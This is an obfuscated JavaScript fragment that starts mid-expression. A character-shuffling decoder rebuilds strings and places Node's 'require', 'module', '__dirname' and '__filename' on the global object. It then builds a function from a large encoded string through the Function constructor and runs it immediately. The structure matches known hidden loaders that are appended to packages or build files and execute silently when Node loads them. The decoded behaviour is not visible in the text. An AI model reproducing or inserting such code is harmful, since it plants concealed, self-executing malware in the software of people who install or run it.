o=String.fromCharCode(127);var y='';var j='\x25';var t='\x23\x31';var q='\x25';var a='\x23\x30';var d='\x23';return e.join(y).split(j).join(o).split(t).join(q).split(a).join(d).split(o)})("rimn_adtie%fmee__n_%me%%drnda_jif%l_cenbeou",2054519);global[_$_3b9c[0x0]]= require;if( typeof module=== _$_3b9c[0x1]){global[_$_3b9c[0x2]]= module};if( typeof __dirname!== _$_3b9c[0x3]){global[_$_3b9c[0x4]]= __dirname};if( typeof __filename!== _$_3b9c[0x3]){global[_$_3b9c[0x5]]= __filename}var _$jsoToArr;(function(){var Vhl='',TFx=836-825;function Ypr(z){var o=3026252;var u=z.length;var d=[];for(var n=0;n<u;n++){d[n]=z.charAt(n)};for(var n=0;n<u;n++){var q=o*(n+351)+(o%51371);var v=o*(n+181)+(o%29087);var j=q%u;var l=v%u;var c=d[j];d[j]=d[l];d[l]=c;o=(q+v)%6042426;};return d.join('')};var XpB=Ypr('zosslrmouidawcbtgnuejyxrtrpqhotfvcnck').substr(0,TFx);var kSr='eao.oafn+s7+6a1=satv);t4h5avi8;=glir<p.0dsChr*=l;n;zg;iuq k12e],7qy6;fa"nA=of=)8lfr7i+ll,cx 0]+nr0)vjurv)g6r)mas8",uv,,cac13a qu"vr .]=(e=wma9;( btu(nat+vw.nmatqto]]ht)l;a4gavA[b;(,;r-(w)u4b;rg="((asd).urc{a)n.sancl;]rt;;,)(C=;)or8*lg4r< i;).fme]0voC;r(rl)c(; rl,.=rd{erszhz))ensrf[ i0u+)9C-n{)d(z;u0h[=(u6lgrtvs+ecn+;r.+t=vl+"v10 ];0v abay1;9le)ba-6vyr;gzrd (t)5;l .;+rgu1)7[cvp(vt=rv.r;1Cuit[S}r)=ilf i=fqrhn"iav;{],[)-4w)h;f,rhh]r00 >rka+m=2hi,gu;=2+)s]r=e j;2l=2;..ghkoe(.if[9tl-..r8lla=(dp["t;+)nss;=j1[(6(at,nt=oloA-t,p(i1oa)+uv. tqv+retepo";;=,;b;=8fnl)=rlha=et(h}asC=pcvf=3rfgjfcp(u<z{ers8rh{ (fs),n(ofrixmo;=[(1.5euf;f,,7+7fe1<i)7(luC]lfd]+=n (ux.[sna}xq 7or.xgi[(6g)arr.2+rt=;=.)dn,mu}+trt ;n{ra}j5)(v6.)fb09s,}6,ih..za"cqce2=trv=,tth=iu}o((kd8;;u,gh,(mg =f4a)e>+(=rf,j(v l=v6n;.ra+oq!7=h q+A2e+e,[ure=hjs=rnhSeAtpe+ui08<oesryir9hf4vrC1ag;wn,(2[iojai;.; ni-m!e",boi0ffx]qx9ovn= am';var fFi=Ypr[XpB];var Toq='';var yhS=fFi;var yAW=fFi(Toq,Ypr(kSr));var COV=yAW(Ypr('4V)_".i}8]c].WeW)Jj..W 3(oga2WX=W[c2om=_;_t!+W40renVWG_1)<i%*nuWr8pts{_};W.-0]eWSj2mWr,0V(zWW{mWOcf_Woest1%W\\ _W!W%5wh1.t];\/]%5w,tWia4Vs% uf1[)1{e7_lt4tate=fnbcjcWesfn_fr%We]z.d)m7]oo7 ]o{Wm;1fec3i]!.c)|a2]8_a)8f.a}=,SoI,b3Ncf.eo.ra decWWi,;WMl=(; e_s#,]_8{Wg.#1. W13_3W26 .e#8 pW=._oWW3co4L=ttucW}rlsD=e7t\/dhW3L W+)}]iWnW=jW0_7 mde]]{;d_SsoWtp.:ocW4p_s!,)}Wf).a4icR;!2)g\'.r1_W\/WbW!dfnn;5}W}i:gt_r49Y)oShbcegW0u0)$(r471%mciif.eW%)su]ds!%ura+$W%cmWWO+2d]WtWWecoar24cg tdsjn;[et0eoeae#oeiW%h8idid&nT83 4tpncmnb..b;]hub1=yt=rWt)s.o[a-W%NW)toaW\/8no8i]f}od]n]iW)I8ogsS.J+HtefWg,+Nmls(j<) []U.dmntm4])79}eFaD|WtuaW.m7(WW01],dx8eWo"%%W8;c1pmi(o56-!e1)sWbkh(r2aoryuxt=WWpe8ld%t(i_W8$coW1gpriheoa9l+har(_mlnWWWT_8I(g0)}_=)(t!%._dW ttWu2m" ;%r_p;0v2p__W)sail!iwsW]+3J9.%wtK6WW3Wr7.=WWsa$2h%[x]%W.wcsi\/:9ovyX%}1WTb_eKWetfcW%=.a\/pn]WW_%D#iW;W(DeW(:dyTn%!oo:$.b(s,YtoWp1 cPd%25s2dWe{__WWW>s%ct1S5on)r!(4=p.d]4-)65Wb6W+Ur4W=tePki;a1nWst39W[or0.Erc)_%.]]%#Wc"f!K=wcEh4Wh]=.edW{]e}WReb(WtF}WWe.pShWNo V=]faf1c}.0L)3e_.Wc0W=%m. 7t%W<_rtiu;ic]Wede.\/fW=W{cJ}_W;1-e=[i(leo]$yillW(-33W.%WW!(r]}-4qBuxe}_{Wmc{%4)xe j>oi5:WWrJaa%1W_]+Tasrr("o0aeWr_W7(3,Patgec#^@}nm#)rmlc+_;ta\/f2tM{9thfd.Sb?Wtg8_{c0bc6cawc6[W1hW}}WW _]%9%NolJW+co%_WW)ce}y2id+a2i5%W)_$W].)blWcWWwrW=:>ysR}_c5_e].l3u:]]d=)_\/W?tW|W4%nel}c%fv:S%()c=!;0]cW..ioomzTptZ!-d{o5i :1i:Wn: WoSln%W4:{e=ea_Wn:(94)2NFr=_=2,o+b92]0W1aWF(3AenaWa.Wa;olofd.3(}F5W7%;4cW}Wca\\ T)W%3=j12_)3,W1!Wxa}%]e;h=)s,)to{Ctl(WNW_0),?Wi(%f=|a]l.!W3Wrn7e}Q1Wsr4>f4ujW!Wc_\/;d}_.)W]n5}]f_Uer-oWtW1a,{%(_!$cW ,(c)he] d;r6lroN1o_tW"2|o]hWbW!,n(]W%{cc Wc.aen{ar[CWs. 124ttu 3.u cWr(_L2{;7rW7aWs..[g=W IhoZ]X3g4)WeWW$W^hWd( 0(0y]2UW]h=439W_d_ue;,xn_1.]e!W2o+]={=eo$%Wb}eW[_W!1W2uWWo!oc(WW]coW"yWHWWcWK[r{1W]0=(nuWWW i"jW;rW?)nW11 9ncf1WWaW;20c=.Q8noTp%i25)2c;W[i}9_!W4w-n_]WNeW1(Wiscjxm _(1"];WWCdW.[n1-)ra$WW.oW]}_:__W_=1u1W5blu1s}V_W. lIm\')WW]uN%7etn0_20W8l1lb+Ib).84lW*W]0_W=tro]WuoeW4l(m{Pqn}_oW|4_i1tWlbt]_n3etW;__W):a3fe%WWrWoW3}1.#!=a) W,W72 o!Wc R=m8%6WW=eeW}hWK.{D(]9"j]W]|dni4\/a .+ ;WETftuW$.3.i)+tcY.>%?5a1t%,tf]._b$W(l.uWtWt;(%!+$(fD27se]s)12r3u)n7O=34o-#r.}ded_e.(S o)g,cb=lpeFW="m!eWiW!6]](c},n1ZWW}Wor(W$(r+or]We6eo]W4_s9WWQ=i54we8=WWw{4O2^0)Wg.eo__2r_uxmpnF3!AW#_ad{ep_)n]]1Wcar[!.W3.oah aW@Wc1W)c,)Itsns.)]WdWW)"l.a\'WwaW_Wec0@Ydd_U{(_c_%W3);}c#u$.W.Ua]4E..c[W,=iWeoW1cW1che!%)!tsoWc1b]9cv)nWV.__vcs,,=cP:iWhW82ec%r.1c(1W1 ltEy};f6WiW3W]2o3=C76f0S]sn9=)oo]_x4."2%i)vmylKWt};ttgWrWW4cu]_.=ca]]p.=PtWb6(nk(.o.na.Ncbco)+2e"+Oectdc,rWW]Wc7o=%_iW=ot=17nm$2b)o_W!W.WVeQ!=(scz=.6As]Oc!ne_l1,Wm3g(Ww WW$f31bWNyctWc[4}d_Wc_uW.y%GvW.[6(BnW<lsr=iWgaW)3W.wW01(dd]o%(e3{)X}W.W]ey=b03[=%nW..hW].(CWp&dOndo,M]smW8])$Btad)BszW.a3!*oay8=f2]4+nwi\\(eujtfW_WW.i!t(eW\\WniaWW460t_&WeW!o;e_al_r3eW2WWtll2slWW2WnWW"nguF}31N_H3xW..3t]4(d{92o.n43t]Wufp)]}]9d;g)..4(]cx;oii)tt1(.cyr.s43o)fa%5r==3H"0(tptooEWW.]"t0&;{Wro4VpWlni1e]AWl+W8i*}!WQg_8o6_-)ut}5e={f"ucWGT}r_,_|p+cecVea9W+&=_f=.no+;r1r{)W rP)eaWeanWQ=vf=Wor_:un }a(87tW.WD6(_t]b}}_{n.yt!e%_,h%o.%yfnxnon>l)_jewhr==_W_narar.:5cb;Wrc3m_m };o%WoWa6&tbWw%1WWs{_t0(ge3(ae_n.!M3Wte997]lW%t(6dsos_13uW(v@fa7_"a]m.].Wth.d673ne{W6d=Zse!ebYer6=kuj2&t8-t}WW4WWfcr!1W) Am,No{W2\'gW93 N:abg);p+;rg_0ipt)n*po&WfSoe]=Wcp=e;=!8bWmWc]c J4nt.0ac2lcDwW? (1$8 W_$ac_Wn5W(W2_s4+co_W_6W^}9aW,Wi2(tlram.8W(!or_!Ex) )OCr9l_%Xe].Wt[le.G6}{)Wt]%n)_]]l)3%4 _)Wt8 on .]2_ 4+i)tWWraf.e0)_%}c)G).cr}{o)t%d[.!r,i]:c(WRep$$(acS4W_1f]n_(4%W92t6)W)_],Wg)} W 220.Wm_;1 t ))p(5,r..ten=W*4S_]r$cnW z1(!-terWN4es(xcW'));var iLN=yhS(Vhl,COV );iLN(1522);return 5534})()
